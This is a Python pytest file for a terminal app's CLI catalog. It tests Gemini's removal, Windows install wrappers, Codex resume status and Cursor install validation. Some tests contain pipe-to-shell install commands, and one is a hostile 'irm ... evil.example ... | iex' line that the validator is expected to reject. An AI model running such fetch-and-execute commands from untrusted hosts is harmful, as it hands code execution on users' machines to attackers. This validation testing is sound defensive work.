"""Pruebas WP-1 (v2.0.2): catalogo sin Gemini, instalacion en Windows y Codex resume sin verificar."""

from __future__ import annotations

from pathlib import Path

import pytest

from conftest import make_test_db
from src.adapters.terminal import (
    CliCatalogService,
    PosixPtyHostConnector,
    load_repo_catalog,
)
from src.adapters.terminal.cli_catalog import MCP_CONFIG_FORMATS, CatalogValidationError, validate_install_command
from src.adapters.terminal.cli_install import build_install_command
from src.adapters.terminal.mcp_injection import McpInjectionError, _render_config, default_agy_config_path
from src.app.api_bridge import ApiBridge


def test_gemini_is_not_in_repo_catalog_nor_formats() -> None:
    cat = load_repo_catalog()
    assert "gemini" not in cat.profiles
    assert set(cat.profiles) == {"claude", "codex", "opencode", "antigravity", "cursor", "custom_shell"}
    assert "gemini_settings_json" not in MCP_CONFIG_FORMATS
    with pytest.raises(McpInjectionError):
        _render_config("gemini_settings_json", "http://127.0.0.1:8765/mcp", "tok")


def test_gemini_profile_spawn_is_unknown(tmp_path: Path) -> None:
    svc = CliCatalogService(
        user_catalog_path=tmp_path / "no_user_catalog.json",
        which=lambda _name: None,
        platform="linux",
        home=str(tmp_path / "home"),
        environ={},
    )
    argv, res, spec = svc.build_launch("gemini")
    assert argv is None and spec is None and res.found is False
    if PosixPtyHostConnector.is_available():
        host = PosixPtyHostConnector(max_panes=2, catalog_service=svc)
        try:
            out = host.spawn_session(pane_id=1, cli_profile="gemini")
            assert out["success"] is False
            assert out["code"] == "CLI_PROFILE_UNKNOWN"
            assert "gemini" not in out["known_profiles"]
            assert "antigravity" in out["known_profiles"]
        finally:
            host.close()


def test_antigravity_still_uses_dot_gemini_config_dir(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    fake_home = tmp_path / "home_agy"
    fake_home.mkdir()
    monkeypatch.setenv("HOME", str(fake_home))
    monkeypatch.setenv("USERPROFILE", str(fake_home))
    cfg = default_agy_config_path()
    assert cfg == fake_home / ".gemini" / "config" / "mcp_config.json"
    assert cfg.as_posix().endswith("/.gemini/config/mcp_config.json")


def test_removed_profile_setting_cleaned_and_notice_shown_once(tmp_path: Path) -> None:
    db = make_test_db()
    db.set_extension_setting("terminal_cli", "binary_path.gemini", "/usr/local/bin/gemini")
    db.set_extension_setting("terminal_cli", "binary_path.claude", "/usr/local/bin/claude")

    bridge = ApiBridge(db_manager=db)
    try:
        primary = getattr(bridge.core_kernel.terminal_connector, "primary", bridge.core_kernel.terminal_connector)
        if getattr(primary, "catalog_service", None) is not None:
            primary.catalog_service = CliCatalogService(
                bridge.core_kernel.extension_repo,
                user_catalog_path=tmp_path / "no_user.json",
                which=lambda _n: None,
                platform="linux",
                home=str(tmp_path / "home"),
                environ={},
            )

        first = bridge.pty_list_cli_catalog()
        assert first["success"] is True
        assert first["removed_profiles"] == [
            {
                "id": "gemini",
                "replacement": "antigravity",
                "message": "Gemini CLI ya no está en el catálogo: usa Antigravity.",
            }
        ]
        # El ajuste obsoleto se borro, el de claude sigue intacto y la marca en app_settings quedo guardada.
        assert db.get_extension_setting("terminal_cli", "binary_path.gemini", None) is None
        assert db.get_extension_setting("terminal_cli", "binary_path.claude", None) == "/usr/local/bin/claude"
        assert db.get_setting("catalog.removed_notice.gemini") == "shown"

        # Segunda llamada: ya no devuelve aviso repetido.
        second = bridge.pty_list_cli_catalog()
        assert second["success"] is True
        assert second["removed_profiles"] == []
    finally:
        bridge._close_terminal_matrix()
        bridge.core_kernel.close()


def test_install_available_on_windows_for_claude_codex_antigravity(tmp_path: Path) -> None:
    tools = {"npm", "node", "powershell", "winget"}
    svc = CliCatalogService(
        user_catalog_path=tmp_path / "no_user.json",
        which=lambda name: f"C:\\tools\\{name}.exe" if name in tools else None,
        platform="win32",
        home=str(tmp_path / "home"),
        environ={},
    )
    for cli_id in ("claude", "codex", "antigravity"):
        hint = svc.install_hint(cli_id)
        assert hint["install_available"] is True, (cli_id, hint)
        assert hint["install_command"]
    by_id = {c["id"]: c for c in svc.describe()["clis"]}
    for cli_id in ("claude", "codex", "antigravity"):
        assert by_id[cli_id]["install"]["available"] is True, cli_id


def test_opencode_on_windows_has_no_install_method(tmp_path: Path) -> None:
    tools = {"npm", "node", "powershell", "winget"}
    svc = CliCatalogService(
        user_catalog_path=tmp_path / "no_user.json",
        which=lambda name: f"C:\\tools\\{name}.exe" if name in tools else None,
        platform="win32",
        home=str(tmp_path / "home"),
        environ={},
    )
    hint = svc.install_hint("opencode")
    assert hint["install_available"] is False
    assert hint["install_command"] is None
    row = next(c for c in svc.describe()["clis"] if c["id"] == "opencode")
    assert row["install"]["available"] is False
    assert row["install"]["code"] == "NO_INSTALL_METHOD"


def test_windows_install_wrapper_bypasses_execution_policy_for_the_process_only() -> None:
    argv = build_install_command(
        "npm install -g @openai/codex",
        "win32",
        lambda name: r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" if name == "powershell" else None,
    )
    assert argv[:6] == [
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "-NoLogo",
        "-NoProfile",
        "-ExecutionPolicy",
        "Bypass",
        "-Command",
    ]
    assert "Set-ExecutionPolicy" not in argv[6]
    assert "npm install -g @openai/codex" in argv[6]


def test_codex_resume_not_verified_until_measured() -> None:
    cat = load_repo_catalog()
    codex = cat.get("codex")
    assert codex is not None
    assert codex.resume["verified"] is False
    assert "WP-5b" in codex.resume["note"]


def test_cursor_is_cataloged_with_official_install_and_no_mcp_injection() -> None:
    cat = load_repo_catalog()
    spec = cat.profiles["cursor"]
    assert spec.binary_names == ("cursor-agent",)
    commands = {platform: [opt.command for opt in options] for platform, options in spec.install.items()}
    assert commands["linux"] == ["curl -fsSL https://cursor.com/install | bash"]
    assert commands["darwin"] == ["curl -fsSL https://cursor.com/install | bash"]
    assert commands["win32"] == ["irm https://cursor.com/install?win32=true | iex"]
    # La consulta solo se admite en PowerShell y el host debe seguir siendo de confianza.
    with pytest.raises(CatalogValidationError):
        validate_install_command("curl_sh", "curl -fsSL https://cursor.com/install?win32=true | bash")
    with pytest.raises(CatalogValidationError):
        validate_install_command("powershell_irm", "irm https://evil.example/install?win32=true | iex")
    # No se inyecta MCP ni se habilita ninguna capacidad sin medirla.
    assert spec.mcp.get("method") == "none"
    for capability in ("activity", "delivery", "role_launch", "session"):
        assert not spec.capability_verified(capability, "linux")
